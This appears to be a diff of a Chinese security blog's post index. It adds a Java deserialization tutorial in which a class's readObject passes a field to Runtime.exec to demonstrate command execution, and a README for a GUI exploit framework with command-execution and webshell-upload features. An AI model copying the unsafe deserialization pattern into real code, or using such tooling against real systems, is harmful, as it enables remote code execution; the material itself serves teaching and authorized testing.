+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line">        serialize(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(User user)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fout);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到运行后，生产了一个文件，将<code>user</code> 对象变成了可持久化存储的二进制数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211458.png" alt="image-20210404222530833"></p>
+<p>可以来看一下该对象序列化后的二进制数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211505.png" alt="image-20210404223840477"></p>
+<p>序列化的数据流以魔术数字和版本号开头，这个值是在调用<code>ObjectOutputStream</code>序列化时，由<code>writeStreamHeader</code>方法写入。开头的几位一般来当作Java序列化字节的特征。</p>
+<p><strong>反序列化</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        <span class="comment">// 反序列化，将字节序列恢复为对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(user1.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211519.png" alt="image-20210404224748419"></p>
+<p>读取了序列化文件，将二进制文件重新恢复为<code>user</code>对象，对象里面的属性也是完美恢复。</p>
+<h3 id="3-2-Externalizable"><a href="#3-2-Externalizable" class="headerlink" title="3.2 Externalizable"></a>3.2 Externalizable</h3><p>通过实现<code>Externalizable</code>接口进行序列化和反序列胡，但必须实现<code>writeExternal</code>、<code>readExternal</code>方法，并且还要实现一个类的<strong>无参构造方法</strong>，<code>Serializable</code> 接口可以不用实现。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/5 00:24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现了Externalizable这个接口需要提供无参构造，在反序列化时会检测</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用法和实现了<code>Serializable</code>接口一样，这里就不演示了。</p>
+<h2 id="0x04-readObject-方法"><a href="#0x04-readObject-方法" class="headerlink" title="0x04 readObject()方法"></a>0x04 readObject()方法</h2><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用。因为在序列化过程中，JVM虚拟机会试图调用对象类里的 <code>writeObject</code> 和 <code>readObject</code> 方法，进行用户自定义的序列化和反序列化，如果没有这样的方法，则默认调用是 <code>ObjectOutputStream</code> 的 <code>defaultWriteObject</code> 方法以及 <code>ObjectInputStream</code> 的 <code>defaultReadObject</code> 方法。用户自定义的 <code>writeObject</code> 和 <code>readObject</code> 方法可以允许用户控制序列化的过程，比如可以在序列化的过程中动态改变序列化的数值。 </p>
+<blockquote>
+<p>  Java反序列化的过程中可以自动执行序列化类的四个方法，实现了<code>Serializable</code>接口可以执行的方法包括<code>readObject</code>、<code>readObjectNoData</code>、<code>readResolve</code>，以及实现了<code>Externalizable</code>接口的<code>readExternal</code>方法。这些在找反序列化漏洞时都需要重点关注。</p>
+</blockquote>
+<p>如果<code>readObject</code>方法书写不当的话就有可能引发恶意代码的执行，例如</p>
+<p><strong>基本类</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的EvilClass(String name)构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的getName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的setName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的toString()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EvilClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + getName() + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;的readObject()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="comment">// windows</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, name&#125;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, name&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>readObject</code>中存在执行命令的代码<code>Runtime.getRuntime().exec(new String[]&#123;&quot;open&quot;, &quot;-a&quot;, name&#125;)</code>，name参数是要执行的命令。那么我们可以构造一个恶意的对象，将其name属性赋值为要执行的命令，当反序列化触发<code>readObject</code>时就会RCE。如下</p>
+<p><strong>序列化和反序列化</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line"><span class="comment">//        evilObj.setName(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        evilObj.setName(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = serializeToBytes(evilObj);</span><br><span class="line">	<span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">o</span> <span class="operator">=</span> (EvilClass)deserializeFromBytes(bytes);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serializeToBytes(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromBytes</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211527.png" alt="image-20210405000541157"></p>
+<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中，这样写的开发绝对会被拉出去祭天的。所以反序列化漏洞通常会需要Java的一些特性进行配合比如<code>反射(invoke)</code>。然后就是利用链的寻找。反序列化漏洞需要三个东西</p>
+<ol>
+<li>反序列化入口(source)</li>
+<li>目标方法(sink)</li>
+<li>利用链(gadget chain)</li>
+</ol>
+<p>大佬们基本都会去寻找重写了这个<code>readObject</code>方法的类，并配合Java的<code>invoke</code>反射机制，构造利用链，形成了Java中最具特色的反序列化攻击。而且再看上图中的输出结果，不仅仅触发了<code>readObject</code>方法，还触发了<code>toString()</code>、<code>无参构造</code>、<code>set</code>、<code>get</code>方法，那么在实际寻找利用链的过程中就不仅仅需要关注<code>readObject()</code>的方法了。</p>
+<p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Java反序列之从萌新到菜鸟 <a href="https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/">https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/</a> </p>
+<p>Java反序列化技术分享 <a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a> </p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图形化漏洞利用Demo-JavaFX版</title>
+    <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
+    <content><![CDATA[<h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p>
+<p>虽然有很多优秀的命令行利用工具，但我觉得还是带界面的方便、直观。</p>
+<p>使用本项目，你不需要懂太多Java语言，只需要了解基本的语法，参考自带的EXP例子，即可快速开发一款<strong>属于你自己</strong>的漏洞利用工具，建立自己的漏洞利用库。</p>
+<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
+<h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>经过多次改版，这是最终(?)的效果。详细见<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
+<p><a href="https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4">https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4</a></p>
+<video controls="controls" loop="loop" autoplay="autoplay" width="100%"> 
+    <source src="/img/SJ.mp4" type="video/mp4">
+</video>
+
+<h2 id="0x03-编写属于你的图像化漏洞利用工具"><a href="#0x03-编写属于你的图像化漏洞利用工具" class="headerlink" title="0x03 编写属于你的图像化漏洞利用工具"></a>0x03 编写属于你的图像化漏洞利用工具</h2><h4 id="3-1-项目结构"><a href="#3-1-项目结构" class="headerlink" title="3.1 项目结构"></a>3.1 项目结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── ExpDemo-JavaFX.iml</span><br><span class="line">├── logs          运行日志文件</span><br><span class="line">│   ├── debug.log</span><br><span class="line">│   └── error.log</span><br><span class="line">├── pom.xml</span><br><span class="line">└── src</span><br><span class="line">    └── main</span><br><span class="line">        ├── java</span><br><span class="line">        │   └── fun</span><br><span class="line">        │       └── fireline</span><br><span class="line">        │           ├── AppStartUp.java    应用程序启动入口</span><br><span class="line">        │           ├── controller    控制JavaFX图形化界面的各种显示、事件等，核心代码 </span><br><span class="line">        │           │   ├── MainController.java  主界面的controller，负责切换界面和基本信息显示</span><br><span class="line">        │           │   ├── OAController.java   OA漏洞利用切换界面的相关逻辑</span><br><span class="line">        │           │   ├── OthersController.java  其他漏洞界面的相关逻辑</span><br><span class="line">        │           │   ├── Struts2Controller.java  Struts2漏洞利用界面的相关逻辑</span><br><span class="line">        │           │   └── oa      OA漏洞利用的相关逻辑</span><br><span class="line">        │           │       └── OASeeyonController.java</span><br><span class="line">        │           ├── core     核心代码文件夹</span><br><span class="line">        │           │   ├── Constants.java   一些常量基本信息</span><br><span class="line">        │           │   ├── ExploitInterface.java   exp 编写要实现的接口</span><br><span class="line">        │           │   ├── Job.java    一种漏洞全部检查的类</span><br><span class="line">        │           │   └── VulInfo.java</span><br><span class="line">        │           ├── exp			各种 exp 实现类</span><br><span class="line">        │           │   ├── apache</span><br><span class="line">        │           │   │   └── struts2</span><br><span class="line">        │           │   │       ├── S2_005.java</span><br><span class="line">        │           │   │       ├── S2_009.java</span><br><span class="line">        │           │   │       ├── S2_016.java</span><br><span class="line">        │           │   │       ├── S2_019.java</span><br><span class="line">        │           │   │       ├── S2_032.java</span><br><span class="line">        │           │   │       ├── S2_045.java</span><br><span class="line">        │           │   │       ├── S2_046.java</span><br><span class="line">        │           │   │       └── S2_DevMode.java</span><br><span class="line">        │           │   ├── cms</span><br><span class="line">        │           │   │   └── nc</span><br><span class="line">        │           │   │       └── CNVD_2021_30167.java</span><br><span class="line">        │           │   ├── oracle</span><br><span class="line">        │           │   │   └── CVE_2020_14882.java</span><br><span class="line">        │           │   └── others</span><br><span class="line">        │           │       └── CVE_2021_22986.java</span><br><span class="line">        │           └── tools  工具文件夹</span><br><span class="line">        │               ├── HttpTool.java  HTTP 请求封装</span><br><span class="line">        │               ├── MyCERT.java    HTTPS 请求证书设置</span><br><span class="line">        │               └── Tools.java     一些处理函数</span><br><span class="line">        └── resources    资源文件夹</span><br><span class="line">            ├── css      界面css样式表</span><br><span class="line">            │   └── main.css</span><br><span class="line">            ├── fxml    界面的设计文件</span><br><span class="line">            │   ├── Main.fxml</span><br><span class="line">            │   ├── OA.fxml</span><br><span class="line">            │   ├── Others.fxml</span><br><span class="line">            │   ├── Struts2.fxml</span><br><span class="line">            │   ├── Weblogic.fxml</span><br><span class="line">            │   └── oa</span><br><span class="line">            │       ├── OA-E-office.fxml</span><br><span class="line">            │       ├── OA-Kingdee.fxml</span><br><span class="line">            │       ├── OA-Landray.fxml</span><br><span class="line">            │       └── OA-Seeyon.fxml</span><br><span class="line">            ├── img</span><br><span class="line">            │   ├── sec.png</span><br><span class="line">            │   └── weixin.jpg</span><br><span class="line">            └── log4j.properties   日志相关设置</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-编写EXP"><a href="#3-2-编写EXP" class="headerlink" title="3.2 编写EXP"></a>3.2 编写EXP</h4><p>编写EXP时，要使用 <code>implements</code>实现<code>ExploitInterface</code>接口，实现接口中的几个方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133114.png" alt="image-20210327190517731"></p>
+<ul>
+<li>checkVUL		使用poc 检查是否漏洞</li>
+<li>exeCMD          使用exp执行命令</li>
+<li>uploadFile        使用命令执行 写webshell，上传文件</li>
+<li>getWebPath     获取网站的web目录，供上传文件使用</li>
+<li>isVul                是否存在漏洞，检查时会根据结构自动赋值，供后续调用</li>
+</ul>
+<p>EXP具体编写请参考 <code>fun/fireline/exp</code> 下的各种漏洞实现</p>
+<p>当编写完EXP后，转到 <code>fun/fireline/controller</code> 下对应的<strong>xxController.java</strong>文件，比如新编写了Struts2的相关漏洞，修改<strong>Struts2Controller.java</strong>的<strong>STRUTS2</strong>变量，新加入一个漏洞名称，这里对应的是图像化界面中可供选择的漏洞列表</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133131.png" alt="image-20210818125816864"></p>
+<p>之后进入和 <code>fun/fireline/tools/Tools.java</code> 的<strong>getExploit</strong>方法中新增一个<strong>else if</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133137.png" alt="image-20210818130128550"></p>
+<p>编写完后，可以直接执行<code>fun/fireline/AppStartUp.java</code>类, 查看是否正常运行。</p>
+<p>开发过程中每次修改完运行前，最好将生成的<strong>target</strong>目录删除再运行</p>
+<h4 id="3-3-新增漏洞页面"><a href="#3-3-新增漏洞页面" class="headerlink" title="3.3 新增漏洞页面"></a>3.3 新增漏洞页面</h4><p>具体请看<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
+<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
+<h4 id="3-4-部署，发布"><a href="#3-4-部署，发布" class="headerlink" title="3.4 部署，发布"></a>3.4 部署，发布</h4><p>当一切编写完成，bug修复完毕，在项目根目录下执行 <strong>mvn package assembly:single</strong> 即可生成 <strong>jar</strong> 文件。</p>
+<p>运行使用<strong>target目录下最大的jar文件</strong> </p>
+<p>对方没有Java环境怎么办？</p>
+<p>使用 <strong>mvn jfx:native</strong> 命令生产对应平台的文件，比如Mac下，执行命令<strong>mvn jfx:native</strong>命令就会在 <strong>target&#x2F;jfx&#x2F;native</strong> 目录下生成打包后应用(win下生成exe)，带可执行文件，带 JRE 运行环境，超大，200+M。</p>
+<p> <strong>mvn clean</strong>用于清除生成的文件。</p>
+<h2 id="0x05-免责声明"><a href="#0x05-免责声明" class="headerlink" title="0x05 免责声明"></a>0x05 免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。</p>
+<p>如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。</p>
+<p>除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。</p>
+<p>您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
+<h2 id="开心指数"><a href="#开心指数" class="headerlink" title="开心指数"></a>开心指数</h2><p><a href="https://starchart.cc/yhy0/ExpDemo-JavaFX"><img src="https://starchart.cc/yhy0/ExpDemo-JavaFX.svg" alt="Stargazers over time"></a></p>
+]]></content>
+      <categories>
+        <category>开源工具</category>
+      </categories>
+      <tags>
+        <tag>开源工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>域渗透-DCSync和黄金票据</title>
     <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
     <content><![CDATA[<blockquote>
@@ -1871,57 +1922,6 @@
       <tags>
         <tag>Windows提权</tag>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图形化漏洞利用Demo-JavaFX版</title>
-    <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
-    <content><![CDATA[<h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p>
-<p>虽然有很多优秀的命令行利用工具，但我觉得还是带界面的方便、直观。</p>
-<p>使用本项目，你不需要懂太多Java语言，只需要了解基本的语法，参考自带的EXP例子，即可快速开发一款<strong>属于你自己</strong>的漏洞利用工具，建立自己的漏洞利用库。</p>
-<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
-<h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>经过多次改版，这是最终(?)的效果。详细见<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
